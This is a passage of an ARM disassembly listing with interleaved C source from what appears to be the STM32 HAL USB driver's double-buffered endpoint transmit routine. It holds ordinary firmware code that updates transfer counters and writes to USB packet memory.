 8003072:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003076:	2b00      	cmp	r3, #0
 8003078:	f000 82fa 	beq.w	8003670 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 800307c:	68fb      	ldr	r3, [r7, #12]
 800307e:	681b      	ldr	r3, [r3, #0]
 8003080:	461a      	mov	r2, r3
 8003082:	68bb      	ldr	r3, [r7, #8]
 8003084:	781b      	ldrb	r3, [r3, #0]
 8003086:	009b      	lsls	r3, r3, #2
 8003088:	4413      	add	r3, r2
 800308a:	881b      	ldrh	r3, [r3, #0]
 800308c:	b29b      	uxth	r3, r3
 800308e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003092:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003096:	82fb      	strh	r3, [r7, #22]
 8003098:	68fb      	ldr	r3, [r7, #12]
 800309a:	681b      	ldr	r3, [r3, #0]
 800309c:	461a      	mov	r2, r3
 800309e:	68bb      	ldr	r3, [r7, #8]
 80030a0:	781b      	ldrb	r3, [r3, #0]
 80030a2:	009b      	lsls	r3, r3, #2
 80030a4:	441a      	add	r2, r3
 80030a6:	8afb      	ldrh	r3, [r7, #22]
 80030a8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80030ac:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80030b0:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80030b4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80030b8:	b29b      	uxth	r3, r3
 80030ba:	8013      	strh	r3, [r2, #0]
 80030bc:	e2d8      	b.n	8003670 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 80030be:	88fb      	ldrh	r3, [r7, #6]
 80030c0:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80030c4:	2b00      	cmp	r3, #0
 80030c6:	d021      	beq.n	800310c <HAL_PCD_EP_DB_Transmit+0x22e>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80030c8:	68fb      	ldr	r3, [r7, #12]
 80030ca:	681b      	ldr	r3, [r3, #0]
 80030cc:	461a      	mov	r2, r3
 80030ce:	68bb      	ldr	r3, [r7, #8]
 80030d0:	781b      	ldrb	r3, [r3, #0]
 80030d2:	009b      	lsls	r3, r3, #2
 80030d4:	4413      	add	r3, r2
 80030d6:	881b      	ldrh	r3, [r3, #0]
 80030d8:	b29b      	uxth	r3, r3
 80030da:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80030de:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80030e2:	f8a7 308a 	strh.w	r3, [r7, #138]	; 0x8a
 80030e6:	68fb      	ldr	r3, [r7, #12]
 80030e8:	681b      	ldr	r3, [r3, #0]
 80030ea:	461a      	mov	r2, r3
 80030ec:	68bb      	ldr	r3, [r7, #8]
 80030ee:	781b      	ldrb	r3, [r3, #0]
 80030f0:	009b      	lsls	r3, r3, #2
 80030f2:	441a      	add	r2, r3
 80030f4:	f8b7 308a 	ldrh.w	r3, [r7, #138]	; 0x8a
 80030f8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80030fc:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003100:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003104:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003108:	b29b      	uxth	r3, r3
 800310a:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 800310c:	68bb      	ldr	r3, [r7, #8]
 800310e:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8003112:	2b01      	cmp	r3, #1
 8003114:	f040 82ac 	bne.w	8003670 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 8003118:	68bb      	ldr	r3, [r7, #8]
 800311a:	695a      	ldr	r2, [r3, #20]
 800311c:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003120:	441a      	add	r2, r3
 8003122:	68bb      	ldr	r3, [r7, #8]
 8003124:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 8003126:	68bb      	ldr	r3, [r7, #8]
 8003128:	69da      	ldr	r2, [r3, #28]
 800312a:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800312e:	441a      	add	r2, r3
 8003130:	68bb      	ldr	r3, [r7, #8]
 8003132:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003134:	68bb      	ldr	r3, [r7, #8]
 8003136:	6a1a      	ldr	r2, [r3, #32]
 8003138:	68bb      	ldr	r3, [r7, #8]
 800313a:	691b      	ldr	r3, [r3, #16]
 800313c:	429a      	cmp	r2, r3
 800313e:	d30b      	bcc.n	8003158 <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 8003140:	68bb      	ldr	r3, [r7, #8]
 8003142:	691b      	ldr	r3, [r3, #16]
 8003144:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 8003148:	68bb      	ldr	r3, [r7, #8]
 800314a:	6a1a      	ldr	r2, [r3, #32]
 800314c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003150:	1ad2      	subs	r2, r2, r3
 8003152:	68bb      	ldr	r3, [r7, #8]
 8003154:	621a      	str	r2, [r3, #32]
 8003156:	e017      	b.n	8003188 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 8003158:	68bb      	ldr	r3, [r7, #8]
 800315a:	6a1b      	ldr	r3, [r3, #32]
 800315c:	2b00      	cmp	r3, #0
 800315e:	d108      	bne.n	8003172 <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 8003160:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003164:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003168:	68bb      	ldr	r3, [r7, #8]
 800316a:	2200      	movs	r2, #0
 800316c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003170:	e00a      	b.n	8003188 <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 8003172:	68bb      	ldr	r3, [r7, #8]
 8003174:	2200      	movs	r2, #0
 8003176:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 800317a:	68bb      	ldr	r3, [r7, #8]
 800317c:	6a1b      	ldr	r3, [r3, #32]
 800317e:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 8003182:	68bb      	ldr	r3, [r7, #8]
 8003184:	2200      	movs	r2, #0
 8003186:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003188:	68bb      	ldr	r3, [r7, #8]
 800318a:	785b      	ldrb	r3, [r3, #1]
 800318c:	2b00      	cmp	r3, #0
 800318e:	d165      	bne.n	800325c <HAL_PCD_EP_DB_Transmit+0x37e>
 8003190:	68fb      	ldr	r3, [r7, #12]
 8003192:	681b      	ldr	r3, [r3, #0]
 8003194:	63fb      	str	r3, [r7, #60]	; 0x3c
 8003196:	68fb      	ldr	r3, [r7, #12]
 8003198:	681b      	ldr	r3, [r3, #0]
 800319a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800319e:	b29b      	uxth	r3, r3
 80031a0:	461a      	mov	r2, r3
 80031a2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80031a4:	4413      	add	r3, r2
 80031a6:	63fb      	str	r3, [r7, #60]	; 0x3c
 80031a8:	68bb      	ldr	r3, [r7, #8]
 80031aa:	781b      	ldrb	r3, [r3, #0]
 80031ac:	00da      	lsls	r2, r3, #3
 80031ae:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80031b0:	4413      	add	r3, r2
 80031b2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80031b6:	63bb      	str	r3, [r7, #56]	; 0x38
 80031b8:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031ba:	881b      	ldrh	r3, [r3, #0]
 80031bc:	b29b      	uxth	r3, r3
 80031be:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80031c2:	b29a      	uxth	r2, r3
 80031c4:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031c6:	801a      	strh	r2, [r3, #0]
 80031c8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031cc:	2b3e      	cmp	r3, #62	; 0x3e
 80031ce:	d91d      	bls.n	800320c <HAL_PCD_EP_DB_Transmit+0x32e>
 80031d0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031d4:	095b      	lsrs	r3, r3, #5
 80031d6:	64bb      	str	r3, [r7, #72]	; 0x48
 80031d8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031dc:	f003 031f 	and.w	r3, r3, #31
 80031e0:	2b00      	cmp	r3, #0
 80031e2:	d102      	bne.n	80031ea <HAL_PCD_EP_DB_Transmit+0x30c>
 80031e4:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80031e6:	3b01      	subs	r3, #1
 80031e8:	64bb      	str	r3, [r7, #72]	; 0x48
 80031ea:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031ec:	881b      	ldrh	r3, [r3, #0]
 80031ee:	b29a      	uxth	r2, r3
 80031f0:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80031f2:	b29b      	uxth	r3, r3
 80031f4:	029b      	lsls	r3, r3, #10
 80031f6:	b29b      	uxth	r3, r3
 80031f8:	4313      	orrs	r3, r2
 80031fa:	b29b      	uxth	r3, r3
 80031fc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003200:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003204:	b29a      	uxth	r2, r3
 8003206:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003208:	801a      	strh	r2, [r3, #0]
 800320a:	e044      	b.n	8003296 <HAL_PCD_EP_DB_Transmit+0x3b8>
 800320c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003210:	2b00      	cmp	r3, #0
 8003212:	d10a      	bne.n	800322a <HAL_PCD_EP_DB_Transmit+0x34c>
 8003214:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003216:	881b      	ldrh	r3, [r3, #0]
 8003218:	b29b      	uxth	r3, r3
 800321a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800321e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003222:	b29a      	uxth	r2, r3
 8003224:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003226:	801a      	strh	r2, [r3, #0]
 8003228:	e035      	b.n	8003296 <HAL_PCD_EP_DB_Transmit+0x3b8>
 800322a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800322e:	085b      	lsrs	r3, r3, #1
 8003230:	64bb      	str	r3, [r7, #72]	; 0x48
 8003232:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003236:	f003 0301 	and.w	r3, r3, #1
 800323a:	2b00      	cmp	r3, #0
 800323c:	d002      	beq.n	8003244 <HAL_PCD_EP_DB_Transmit+0x366>
 800323e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003240:	3301      	adds	r3, #1
 8003242:	64bb      	str	r3, [r7, #72]	; 0x48
 8003244:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003246:	881b      	ldrh	r3, [r3, #0]
 8003248:	b29a      	uxth	r2, r3
 800324a:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800324c:	b29b      	uxth	r3, r3
 800324e:	029b      	lsls	r3, r3, #10
 8003250:	b29b      	uxth	r3, r3
 8003252:	4313      	orrs	r3, r2
 8003254:	b29a      	uxth	r2, r3
 8003256:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003258:	801a      	strh	r2, [r3, #0]
 800325a:	e01c      	b.n	8003296 <HAL_PCD_EP_DB_Transmit+0x3b8>
 800325c:	68bb      	ldr	r3, [r7, #8]
 800325e:	785b      	ldrb	r3, [r3, #1]
 8003260:	2b01      	cmp	r3, #1
 8003262:	d118      	bne.n	8003296 <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003264:	68fb      	ldr	r3, [r7, #12]
 8003266:	681b      	ldr	r3, [r3, #0]
 8003268:	647b      	str	r3, [r7, #68]	; 0x44
 800326a:	68fb      	ldr	r3, [r7, #12]
 800326c:	681b      	ldr	r3, [r3, #0]
 800326e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003272:	b29b      	uxth	r3, r3
 8003274:	461a      	mov	r2, r3
 8003276:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8003278:	4413      	add	r3, r2
 800327a:	647b      	str	r3, [r7, #68]	; 0x44
 800327c:	68bb      	ldr	r3, [r7, #8]
 800327e:	781b      	ldrb	r3, [r3, #0]
 8003280:	00da      	lsls	r2, r3, #3
 8003282:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8003284:	4413      	add	r3, r2
 8003286:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800328a:	643b      	str	r3, [r7, #64]	; 0x40
 800328c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003290:	b29a      	uxth	r2, r3
 8003292:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8003294:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 8003296:	68fb      	ldr	r3, [r7, #12]
 8003298:	6818      	ldr	r0, [r3, #0]
 800329a:	68bb      	ldr	r3, [r7, #8]
 800329c:	6959      	ldr	r1, [r3, #20]
 800329e:	68bb      	ldr	r3, [r7, #8]
 80032a0:	891a      	ldrh	r2, [r3, #8]
 80032a2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80032a6:	b29b      	uxth	r3, r3
 80032a8:	f005 f8c9 	bl	800843e <USB_WritePMA>
 80032ac:	e1e0      	b.n	8003670 <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 80032ae:	68fb      	ldr	r3, [r7, #12]
 80032b0:	681b      	ldr	r3, [r3, #0]
 80032b2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80032b6:	b29b      	uxth	r3, r3
 80032b8:	461a      	mov	r2, r3
 80032ba:	68bb      	ldr	r3, [r7, #8]
 80032bc:	781b      	ldrb	r3, [r3, #0]
 80032be:	00db      	lsls	r3, r3, #3
 80032c0:	4413      	add	r3, r2
 80032c2:	68fa      	ldr	r2, [r7, #12]
 80032c4:	6812      	ldr	r2, [r2, #0]
 80032c6:	4413      	add	r3, r2
 80032c8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80032cc:	881b      	ldrh	r3, [r3, #0]
 80032ce:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80032d2:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 80032d6:	68bb      	ldr	r3, [r7, #8]
 80032d8:	699a      	ldr	r2, [r3, #24]
 80032da:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032de:	429a      	cmp	r2, r3
 80032e0:	d307      	bcc.n	80032f2 <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 80032e2:	68bb      	ldr	r3, [r7, #8]
 80032e4:	699a      	ldr	r2, [r3, #24]
 80032e6:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80032ea:	1ad2      	subs	r2, r2, r3
 80032ec:	68bb      	ldr	r3, [r7, #8]
 80032ee:	619a      	str	r2, [r3, #24]
 80032f0:	e002      	b.n	80032f8 <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 80032f2:	68bb      	ldr	r3, [r7, #8]
 80032f4:	2200      	movs	r2, #0
 80032f6:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 80032f8:	68bb      	ldr	r3, [r7, #8]
 80032fa:	699b      	ldr	r3, [r3, #24]
 80032fc:	2b00      	cmp	r3, #0
 80032fe:	f040 80c0 	bne.w	8003482 <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003302:	68bb      	ldr	r3, [r7, #8]
 8003304:	785b      	ldrb	r3, [r3, #1]
 8003306:	2b00      	cmp	r3, #0
 8003308:	d126      	bne.n	8003358 <HAL_PCD_EP_DB_Transmit+0x47a>
 800330a:	68fb      	ldr	r3, [r7, #12]
 800330c:	681b      	ldr	r3, [r3, #0]
 800330e:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003310:	68fb      	ldr	r3, [r7, #12]
 8003312:	681b      	ldr	r3, [r3, #0]
 8003314:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003318:	b29b      	uxth	r3, r3
 800331a:	461a      	mov	r2, r3
 800331c:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800331e:	4413      	add	r3, r2
 8003320:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003322:	68bb      	ldr	r3, [r7, #8]
 8003324:	781b      	ldrb	r3, [r3, #0]
 8003326:	00da      	lsls	r2, r3, #3
 8003328:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800332a:	4413      	add	r3, r2
 800332c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003330:	67bb      	str	r3, [r7, #120]	; 0x78
 8003332:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003334:	881b      	ldrh	r3, [r3, #0]
 8003336:	b29b      	uxth	r3, r3
 8003338:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800333c:	b29a      	uxth	r2, r3
 800333e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003340:	801a      	strh	r2, [r3, #0]
 8003342:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003344:	881b      	ldrh	r3, [r3, #0]
 8003346:	b29b      	uxth	r3, r3
 8003348:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800334c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003350:	b29a      	uxth	r2, r3
 8003352:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003354:	801a      	strh	r2, [r3, #0]
 8003356:	e01a      	b.n	800338e <HAL_PCD_EP_DB_Transmit+0x4b0>
 8003358:	68bb      	ldr	r3, [r7, #8]
 800335a:	785b      	ldrb	r3, [r3, #1]
 800335c:	2b01      	cmp	r3, #1
 800335e:	d116      	bne.n	800338e <HAL_PCD_EP_DB_Transmit+0x4b0>
 8003360:	68fb      	ldr	r3, [r7, #12]
 8003362:	681b      	ldr	r3, [r3, #0]
 8003364:	667b      	str	r3, [r7, #100]	; 0x64
 8003366:	68fb      	ldr	r3, [r7, #12]
 8003368:	681b      	ldr	r3, [r3, #0]
 800336a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800336e:	b29b      	uxth	r3, r3
 8003370:	461a      	mov	r2, r3
 8003372:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003374:	4413      	add	r3, r2
 8003376:	667b      	str	r3, [r7, #100]	; 0x64
 8003378:	68bb      	ldr	r3, [r7, #8]
 800337a:	781b      	ldrb	r3, [r3, #0]
 800337c:	00da      	lsls	r2, r3, #3
 800337e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8003380:	4413      	add	r3, r2
 8003382:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003386:	663b      	str	r3, [r7, #96]	; 0x60
 8003388:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 800338a:	2200      	movs	r2, #0
 800338c:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 800338e:	68fb      	ldr	r3, [r7, #12]
 8003390:	681b      	ldr	r3, [r3, #0]
 8003392:	677b      	str	r3, [r7, #116]	; 0x74
 8003394:	68bb      	ldr	r3, [r7, #8]
 8003396:	785b      	ldrb	r3, [r3, #1]
 8003398:	2b00      	cmp	r3, #0
 800339a:	d12b      	bne.n	80033f4 <HAL_PCD_EP_DB_Transmit+0x516>
 800339c:	68fb      	ldr	r3, [r7, #12]
 800339e:	681b      	ldr	r3, [r3, #0]
 80033a0:	66fb      	str	r3, [r7, #108]	; 0x6c
 80033a2:	68fb      	ldr	r3, [r7, #12]
 80033a4:	681b      	ldr	r3, [r3, #0]
 80033a6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80033aa:	b29b      	uxth	r3, r3
 80033ac:	461a      	mov	r2, r3
 80033ae:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80033b0:	4413      	add	r3, r2
 80033b2:	66fb      	str	r3, [r7, #108]	; 0x6c
 80033b4:	68bb      	ldr	r3, [r7, #8]
 80033b6:	781b      	ldrb	r3, [r3, #0]
 80033b8:	00da      	lsls	r2, r3, #3
 80033ba:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 80033bc:	4413      	add	r3, r2
 80033be:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80033c2:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 80033c6:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033ca:	881b      	ldrh	r3, [r3, #0]
 80033cc:	b29b      	uxth	r3, r3
 80033ce:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80033d2:	b29a      	uxth	r2, r3
 80033d4:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033d8:	801a      	strh	r2, [r3, #0]
 80033da:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033de:	881b      	ldrh	r3, [r3, #0]
 80033e0:	b29b      	uxth	r3, r3
 80033e2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80033e6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80033ea:	b29a      	uxth	r2, r3
 80033ec:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 80033f0:	801a      	strh	r2, [r3, #0]
 80033f2:	e017      	b.n	8003424 <HAL_PCD_EP_DB_Transmit+0x546>
 80033f4:	68bb      	ldr	r3, [r7, #8]
 80033f6:	785b      	ldrb	r3, [r3, #1]
 80033f8:	2b01      	cmp	r3, #1
 80033fa:	d113      	bne.n	8003424 <HAL_PCD_EP_DB_Transmit+0x546>
 80033fc:	68fb      	ldr	r3, [r7, #12]
 80033fe:	681b      	ldr	r3, [r3, #0]
 8003400:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003404:	b29b      	uxth	r3, r3
 8003406:	461a      	mov	r2, r3
 8003408:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 800340a:	4413      	add	r3, r2
 800340c:	677b      	str	r3, [r7, #116]	; 0x74
 800340e:	68bb      	ldr	r3, [r7, #8]
 8003410:	781b      	ldrb	r3, [r3, #0]
 8003412:	00da      	lsls	r2, r3, #3
 8003414:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 8003416:	4413      	add	r3, r2
 8003418:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800341c:	673b      	str	r3, [r7, #112]	; 0x70
 800341e:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8003420:	2200      	movs	r2, #0
 8003422:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003424:	68bb      	ldr	r3, [r7, #8]
 8003426:	781b      	ldrb	r3, [r3, #0]
 8003428:	4619      	mov	r1, r3
 800342a:	68f8      	ldr	r0, [r7, #12]
 800342c:	f009 fa69 	bl	800c902 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003430:	88fb      	ldrh	r3, [r7, #6]
 8003432:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003436:	2b00      	cmp	r3, #0
 8003438:	f040 811a 	bne.w	8003670 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 800343c:	68fb      	ldr	r3, [r7, #12]
 800343e:	681b      	ldr	r3, [r3, #0]
 8003440:	461a      	mov	r2, r3
 8003442:	68bb      	ldr	r3, [r7, #8]
 8003444:	781b      	ldrb	r3, [r3, #0]
 8003446:	009b      	lsls	r3, r3, #2
 8003448:	4413      	add	r3, r2
 800344a:	881b      	ldrh	r3, [r3, #0]
 800344c:	b29b      	uxth	r3, r3
 800344e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8003452:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8003456:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 800345a:	68fb      	ldr	r3, [r7, #12]
 800345c:	681b      	ldr	r3, [r3, #0]
 800345e:	461a      	mov	r2, r3
 8003460:	68bb      	ldr	r3, [r7, #8]
 8003462:	781b      	ldrb	r3, [r3, #0]
 8003464:	009b      	lsls	r3, r3, #2
 8003466:	441a      	add	r2, r3
 8003468:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 800346c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003470:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003474:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8003478:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800347c:	b29b      	uxth	r3, r3
 800347e:	8013      	strh	r3, [r2, #0]
 8003480:	e0f6      	b.n	8003670 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003482:	88fb      	ldrh	r3, [r7, #6]
 8003484:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8003488:	2b00      	cmp	r3, #0
 800348a:	d121      	bne.n	80034d0 <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 800348c:	68fb      	ldr	r3, [r7, #12]
 800348e:	681b      	ldr	r3, [r3, #0]
 8003490:	461a      	mov	r2, r3
 8003492:	68bb      	ldr	r3, [r7, #8]
 8003494:	781b      	ldrb	r3, [r3, #0]
 8003496:	009b      	lsls	r3, r3, #2
 8003498:	4413      	add	r3, r2
 800349a:	881b      	ldrh	r3, [r3, #0]
 800349c:	b29b      	uxth	r3, r3
 800349e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80034a2:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80034a6:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 80034aa:	68fb      	ldr	r3, [r7, #12]
 80034ac:	681b      	ldr	r3, [r3, #0]
 80034ae:	461a      	mov	r2, r3
 80034b0:	68bb      	ldr	r3, [r7, #8]
 80034b2:	781b      	ldrb	r3, [r3, #0]
 80034b4:	009b      	lsls	r3, r3, #2
 80034b6:	441a      	add	r2, r3
 80034b8:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 80034bc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80034c0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80034c4:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80034c8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80034cc:	b29b      	uxth	r3, r3
 80034ce:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 80034d0:	68bb      	ldr	r3, [r7, #8]
 80034d2:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80034d6:	2b01      	cmp	r3, #1
 80034d8:	f040 80ca 	bne.w	8003670 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 80034dc:	68bb      	ldr	r3, [r7, #8]
 80034de:	695a      	ldr	r2, [r3, #20]
 80034e0:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034e4:	441a      	add	r2, r3
 80034e6:	68bb      	ldr	r3, [r7, #8]
 80034e8:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 80034ea:	68bb      	ldr	r3, [r7, #8]
 80034ec:	69da      	ldr	r2, [r3, #28]
 80034ee:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80034f2:	441a      	add	r2, r3
 80034f4:	68bb      	ldr	r3, [r7, #8]
 80034f6:	61da      	str	r2, [r3, #28]

